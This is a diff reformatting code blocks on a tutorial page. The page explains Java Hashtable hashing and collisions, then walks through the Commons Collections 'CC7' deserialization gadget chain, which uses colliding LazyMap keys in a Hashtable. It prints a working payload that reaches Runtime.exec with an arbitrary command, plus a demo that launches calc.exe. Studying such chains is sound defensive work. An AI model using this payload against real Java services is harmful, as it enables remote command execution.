@@ -162,15 +162,13 @@
 
 <p>Let’s start with a basic example:</p>
 
-<pre><code>
-Hashtable&lt;String, String&gt; ht = new Hashtable&lt;&gt;();
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Hashtable</span>&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">String</span>&gt; ht = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>&lt;&gt;();
 
-ht.put("language", "Java");
-ht.put("author", "James Gosling");
+ht.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"language"</span>, <span style="color: #6aab73;">"Java"</span>);
+ht.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"author"</span>, <span style="color: #6aab73;">"James Gosling"</span>);
 
-System.out.println(ht.get("language"));  // Output: Java
-System.out.println(ht.get("author"));    // Output: James Gosling
-</code></pre>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"language"</span>));  <span style="color: #808080;">// Output: Java</span>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"author"</span>));    <span style="color: #808080;">// Output: James Gosling</span></pre></div>
 
 <p>
     Behind the scenes, when you insert a key like <code>"language"</code>, Java internally computes the hash using the key’s <code>hashCode()</code> method. 
@@ -181,13 +179,11 @@ System.out.println(ht.get("author"));    // Output: James Gosling
     For example:
 </p>
 
-<pre><code>
-String key1 = "Aa";
-String key2 = "BB";
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">String</span> key1 = <span style="color: #6aab73;">"Aa"</span>;
+<span style="color: #cf8e6d;">String</span> key2 = <span style="color: #6aab73;">"BB"</span>;
 
-System.out.println(key1.hashCode());  // 2112
-System.out.println(key2.hashCode());  // 2112 (collision!)
-</code></pre>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(key1.<span style="color: #56a8f5;">hashCode</span>());  <span style="color: #808080;">// 2112</span>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(key2.<span style="color: #56a8f5;">hashCode</span>());  <span style="color: #808080;">// 2112 (collision!)</span></pre></div>
 
 <p>
     Here, both keys produce the same hash code (<code>2112</code>) despite being different strings — this is a <strong>hash collision</strong>, and we'll talk about how it's handled shortly.
@@ -202,9 +198,7 @@ System.out.println(key2.hashCode());  // 2112 (collision!)
     It does this using the following line of code:
 </p>
 
-<pre><code>
-int index = (hash &amp; 0x7FFFFFFF) % table.length;
-</code></pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">int</span> index = (hash &amp; <span style="color: #b3ae60;">0x7FFFFFFF</span>) % table.length;</pre></div>
 
 <ul>
     <li><code>hash &amp; 0x7FFFFFFF</code>: This bitmask ensures the hash code is positive (since <code>hashCode()</code> can return negative values).</li>
@@ -215,9 +209,7 @@ int index = (hash &amp; 0x7FFFFFFF) % table.length;
     So if your hashtable has 16 slots, and <code>hashCode()</code> returns 2112, then:
 </p>
 
-<pre><code>
-index = (2112 &amp; 0x7FFFFFFF) % 16 = 0
-</code></pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">index = (<span style="color: #b3ae60;">2112</span> &amp; <span style="color: #b3ae60;">0x7FFFFFFF</span>) % <span style="color: #b3ae60;">16</span> = <span style="color: #b3ae60;">0</span></pre></div>
 
 <hr>
 
@@ -227,30 +219,26 @@ index = (2112 &amp; 0x7FFFFFFF) % 16 = 0
     That's where hash collisions come in. Java handles them using a technique called <strong>chaining</strong>: it stores multiple entries at the same index as a linked list.
 </p>
 
-<pre><code>
-Hashtable&lt;String, String&gt; ht = new Hashtable&lt;&gt;();
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Hashtable</span>&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">String</span>&gt; ht = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>&lt;&gt;();
 
-String key1 = "Aa";  // hashCode = 2112
-String key2 = "BB";  // hashCode = 2112 (collision)
+<span style="color: #cf8e6d;">String</span> key1 = <span style="color: #6aab73;">"Aa"</span>;  <span style="color: #808080;">// hashCode = 2112</span>
+<span style="color: #cf8e6d;">String</span> key2 = <span style="color: #6aab73;">"BB"</span>;  <span style="color: #808080;">// hashCode = 2112 (collision)</span>
 
-ht.put(key1, "first");
-ht.put(key2, "second");
+ht.<span style="color: #56a8f5;">put</span>(key1, <span style="color: #6aab73;">"first"</span>);
+ht.<span style="color: #56a8f5;">put</span>(key2, <span style="color: #6aab73;">"second"</span>);
 
-System.out.println(ht.get(key1)); // Output: first
-System.out.println(ht.get(key2)); // Output: second
-</code></pre>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(key1)); <span style="color: #808080;">// Output: first</span>
+<span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(ht.<span style="color: #56a8f5;">get</span>(key2)); <span style="color: #808080;">// Output: second</span></pre></div>
 
 <p>
     When retrieving, the Hashtable checks each entry at that index using <code>equals()</code> to identify the correct key:
 </p>
 
-<pre><code>
-for (; entry != null; entry = entry.next) {
-    if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) {
-        return entry.value;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">for</span> (; entry != <span style="color: #cf8e6d;">null</span>; entry = entry.next) {
+    <span style="color: #cf8e6d;">if</span> ((entry.hash == hash) &amp;&amp; entry.key.<span style="color: #56a8f5;">equals</span>(key)) {
+        <span style="color: #cf8e6d;">return</span> entry.value;
     }
-}
-</code></pre>
+}</pre></div>
 
 <p>
     So even if multiple keys hash to the same bucket, Java can still retrieve the right value as long as <code>equals()</code> distinguishes them.
@@ -266,56 +254,48 @@ for (; entry != null; entry = entry.next) {
     <p>
         Below is how the payload looks like
         
-        <pre>
-            
-        <code>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">Hashtable</span> <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">String</span> command) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">Exception</span> {
 
-        public Hashtable getObject(final String command) throws Exception {
+    <span style="color: #808080;">// Reusing transformer chain and LazyMap gadgets from previous payloads</span>
+    <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">String</span>[] execArgs = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{command};
 
-        // Reusing transformer chain and LazyMap gadgets from previous payloads
-        final String[] execArgs = new String[]{command};
+    <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{});
 
-        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+    <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>,
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]}),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>,
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]}),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>,
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>},
+            execArgs),
+        <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #b3ae60;">1</span>)};
 
-        final Transformer[] transformers = new Transformer[]{
-            new ConstantTransformer(Runtime.class),
-            new InvokerTransformer("getMethod",
-                new Class[]{String.class, Class[].class},
-                new Object[]{"getRuntime", new Class[0]}),
-            new InvokerTransformer("invoke",
-                new Class[]{Object.class, Object[].class},
-                new Object[]{null, new Object[0]}),
-            new InvokerTransformer("exec",
-                new Class[]{String.class},
-                execArgs),
-            new ConstantTransformer(1)};
+    <span style="color: #cf8e6d;">Map</span> innerMap1 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+    <span style="color: #cf8e6d;">Map</span> innerMap2 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
 
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
+    <span style="color: #808080;">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
+    <span style="color: #cf8e6d;">Map</span> lazyMap1 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap1, transformerChain);
+    lazyMap1.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"yy"</span>, <span style="color: #b3ae60;">1</span>);
 
-        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
-        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
-        lazyMap1.put("yy", 1);
+    <span style="color: #cf8e6d;">Map</span> lazyMap2 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap2, transformerChain);
+    lazyMap2.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"zZ"</span>, <span style="color: #b3ae60;">1</span>);
 
-        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
-        lazyMap2.put("zZ", 1);
+    <span style="color: #808080;">// Use the colliding Maps as keys in Hashtable</span>
+    <span style="color: #cf8e6d;">Hashtable</span> hashtable = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>();
+    hashtable.<span style="color: #56a8f5;">put</span>(lazyMap1, <span style="color: #b3ae60;">1</span>);
+    hashtable.<span style="color: #56a8f5;">put</span>(lazyMap2, <span style="color: #b3ae60;">2</span>);
 
-        // Use the colliding Maps as keys in Hashtable
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(lazyMap1, 1);
-        hashtable.put(lazyMap2, 2);
+    <span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">setFieldValue</span>(transformerChain, <span style="color: #6aab73;">"iTransformers"</span>, transformers);
 
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+    <span style="color: #808080;">// Needed to ensure hash collision after previous manipulations</span>
+    lazyMap2.<span style="color: #56a8f5;">remove</span>(<span style="color: #6aab73;">"yy"</span>);</pre></div>
 
-        // Needed to ensure hash collision after previous manipulations
-        lazyMap2.remove("yy");
-
-        return hashtable;
-
-        </code>
-
-
-        </pre>
+    <span style="color: #cf8e6d;">return</span> hashtable;
+}</pre></div>
     </p>
     <p>
         So the payload uses the TransFormerChain and LaZyMap along with hashTable.
@@ -328,55 +308,43 @@ for (; entry != null; entry = entry.next) {
     </p>
     <div>
 
-        <pre>
-            <code>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.Hashtable;
+<span style="color: #cf8e6d;">import</span> java.util.List;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
 
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.Hashtable;
-import java.util.List;
-import java.util.Map;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
 
-import java.util.HashMap;
+<span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">cc7</span> {
 
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.*;
-import org.apache.commons.collections.map.LazyMap;
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
 
+        <span style="color: #cf8e6d;">Person</span> pt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Person</span>(<span style="color: #6aab73;">"HelloWorld"</span>);
+        <span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
+        <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr3 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]});
+        <span style="color: #cf8e6d;">InvokerTransformer</span> tr4 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"calc.exe"</span>});
+        <span style="color: #808080;">// System.out.println(transformer.transform(Runtime.class).getClass().getName());</span>
+        <span style="color: #808080;">// System.out.println(tr4.transform(tr3.transform(transformer.transform(tr.transform("HELLO")))));</span>
 
-public class cc7 {
+        <span style="color: #cf8e6d;">ChainedTransformer</span> chain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] { tr, transformer, tr3, tr4 });
 
+        <span style="color: #cf8e6d;">Map</span> innerMap1 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+        <span style="color: #cf8e6d;">Map</span> innerMap2 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
 
-    public static void main(String args[])
-    {
+        <span style="color: #cf8e6d;">Map</span> lazyMap1 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap1, chain);
+        lazyMap1.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"yy"</span>, <span style="color: #b3ae60;">1</span>);
 
-        Person pt=new Person("HelloWorld");
-        ConstantTransformer tr=new ConstantTransformer(Runtime.class);
-        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
-        InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
-        InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
-        //System.out.println(transformer.transform(Runtime.class).getClass().getName());
-        //System.out.println(tr4.transform(tr3.transform(transformer.transform(tr.transform("HELLO")))));
+        <span style="color: #cf8e6d;">Map</span> lazyMap2 = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap2, chain);
+        lazyMap2.<span style="color: #56a8f5;">put</span>(<span style="color: #6aab73;">"zZ"</span>, <span style="color: #b3ae60;">1</span>);
 
-
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { tr, transformer,tr3,tr4 });
-
-
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
-
-        Map lazyMap1 = LazyMap.decorate(innerMap1, chain);
-        lazyMap1.put("yy", 1);
-
-        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
-        lazyMap2.put("zZ", 1);
-
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(lazyMap1, 1);
-        hashtable.put(lazyMap2, 2);
-
-
-    }
+        <span style="color: #cf8e6d;">Hashtable</span> hashtable = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Hashtable</span>();
+        hashtable.<span style="color: #56a8f5;">put</span>(lazyMap1, <span style="color: #b3ae60;">1</span>);
+        hashtable.<span style="color: #56a8f5;">put</span>(lazyMap2, <span style="color: #b3ae60;">2</span>);
+    }</pre></div>
 }
 
             </code>
@@ -386,33 +354,29 @@ public class cc7 {
         <p>
             Now lets understand the above code and flow.<br>
             When we call the put() on hash table the below code gets executed.<br>
-            <pre>
-            <code>
-        public synchronized V put(K key, V value) {
-        // Make sure the value is not null
-        if (value == null) {
-            throw new NullPointerException();
-        }
-
-        // Makes sure the key is not already in the hashtable.
-        Entry<?,?> tab[] = table;
-        int hash = key.hashCode();
-        int index = (hash & 0x7FFFFFFF) % tab.length;
-        @SuppressWarnings("unchecked")
-        Entry<K,V> entry = (Entry<K,V>)tab[index];
-        for(; entry != null ; entry = entry.next) {
-            if ((entry.hash == hash) && entry.key.equals(key)) {
-                V old = entry.value;
-                entry.value = value;
-                return old;
-            }
-        }
-
-        addEntry(hash, key, value, index);
-        return null;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">synchronized</span> <span style="color: #cf8e6d;">V</span> <span style="color: #56a8f5;">put</span>(<span style="color: #cf8e6d;">K</span> key, <span style="color: #cf8e6d;">V</span> value) {
+    <span style="color: #808080;">// Make sure the value is not null</span>
+    <span style="color: #cf8e6d;">if</span> (value == <span style="color: #cf8e6d;">null</span>) {
+        <span style="color: #cf8e6d;">throw</span> <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">NullPointerException</span>();
     }
-            </code>
-            </pre>
+
+    <span style="color: #808080;">// Makes sure the key is not already in the hashtable.</span>
+    <span style="color: #cf8e6d;">Entry</span>&lt;?,?&gt; tab[] = table;
+    <span style="color: #cf8e6d;">int</span> hash = key.<span style="color: #56a8f5;">hashCode</span>();
+    <span style="color: #cf8e6d;">int</span> index = (hash &amp; <span style="color: #b3ae60;">0x7FFFFFFF</span>) % tab.length;
+    <span style="color: #bbb529;">@SuppressWarnings</span>(<span style="color: #6aab73;">"unchecked"</span>)
+    <span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt; entry = (<span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt;)tab[index];
+    <span style="color: #cf8e6d;">for</span>(; entry != <span style="color: #cf8e6d;">null</span> ; entry = entry.next) {
+        <span style="color: #cf8e6d;">if</span> ((entry.hash == hash) &amp;&amp; entry.key.<span style="color: #56a8f5;">equals</span>(key)) {
+            <span style="color: #cf8e6d;">V</span> old = entry.value;
+            entry.value = value;
+            <span style="color: #cf8e6d;">return</span> old;
+        }
+    }
+
+    <span style="color: #56a8f5;">addEntry</span>(hash, key, value, index);
+    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">null</span>;
+}</pre></div>
             <br>
             If you check the above code , the code first takes the entry get's a hashCode of it and in the for loop it checks for the collision.<br>
             if the for loop exeutes to be true then the if condition os checked.<br>
@@ -428,42 +392,38 @@ public class cc7 {
         <p> Now this equals() at AbstractMapDecorator calls map.equals() , map being an abstract class the AbstractMap.equals() gets called</p>
         <P>
             Below is how the equals() at AbstractMap looks Like
-            <pre>
-                <code>
-        public boolean equals(Object o) {
-        if (o == this)
-            return true;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">boolean</span> <span style="color: #56a8f5;">equals</span>(<span style="color: #cf8e6d;">Object</span> o) {
+    <span style="color: #cf8e6d;">if</span> (o == <span style="color: #cf8e6d;">this</span>)
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">true</span>;
 
-        if (!(o instanceof Map))
-            return false;
-        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
-        if (m.size() != size())
-            return false;
+    <span style="color: #cf8e6d;">if</span> (!(o <span style="color: #cf8e6d;">instanceof</span> <span style="color: #cf8e6d;">Map</span>))
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+    <span style="color: #cf8e6d;">Map</span>&lt;?,?&gt; m = (<span style="color: #cf8e6d;">Map</span>&lt;?,?&gt;) o;
+    <span style="color: #cf8e6d;">if</span> (m.<span style="color: #56a8f5;">size</span>() != <span style="color: #56a8f5;">size</span>())
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
 
-        try {
-            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
-            while (i.hasNext()) {
-                Entry&lt;K,V&lg; e = i.next();
-                K key = e.getKey();
-                V value = e.getValue();
-                if (value == null) {
-                    if (!(m.get(key)==null && m.containsKey(key)))
-                        return false;
-                } else {
-                    if (!value.equals(m.get(key)))
-                        return false;
-                }
+    <span style="color: #cf8e6d;">try</span> {
+        <span style="color: #cf8e6d;">Iterator</span>&lt;<span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt;&gt; i = <span style="color: #56a8f5;">entrySet</span>().<span style="color: #56a8f5;">iterator</span>();
+        <span style="color: #cf8e6d;">while</span> (i.<span style="color: #56a8f5;">hasNext</span>()) {
+            <span style="color: #cf8e6d;">Entry</span>&lt;<span style="color: #cf8e6d;">K</span>,<span style="color: #cf8e6d;">V</span>&gt; e = i.<span style="color: #56a8f5;">next</span>();
+            <span style="color: #cf8e6d;">K</span> key = e.<span style="color: #56a8f5;">getKey</span>();
+            <span style="color: #cf8e6d;">V</span> value = e.<span style="color: #56a8f5;">getValue</span>();
+            <span style="color: #cf8e6d;">if</span> (value == <span style="color: #cf8e6d;">null</span>) {
+                <span style="color: #cf8e6d;">if</span> (!(m.<span style="color: #56a8f5;">get</span>(key)==<span style="color: #cf8e6d;">null</span> &amp;&amp; m.<span style="color: #56a8f5;">containsKey</span>(key)))
+                    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+            } <span style="color: #cf8e6d;">else</span> {
+                <span style="color: #cf8e6d;">if</span> (!value.<span style="color: #56a8f5;">equals</span>(m.<span style="color: #56a8f5;">get</span>(key)))
+                    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
             }
-        } catch (ClassCastException unused) {
-            return false;
-        } catch (NullPointerException unused) {
-            return false;
         }
-
-        return true;
+    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">ClassCastException</span> unused) {
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
+    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">NullPointerException</span> unused) {
+        <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">false</span>;
     }
-                </code>
-            </pre>
+
+    <span style="color: #cf8e6d;">return</span> <span style="color: #cf8e6d;">true</span>;
+}</pre></div>
         </P>
         <p>On the above what we need to pay attention is to the else block where  we are calling m.get(key)<br>IF you pay close attention,
         the input here is of ObjectType, and we have sent a LaZyMap here, and the m value is set to the Object 0, so when we call m.get(), LazyMap.get() gets called.</p>
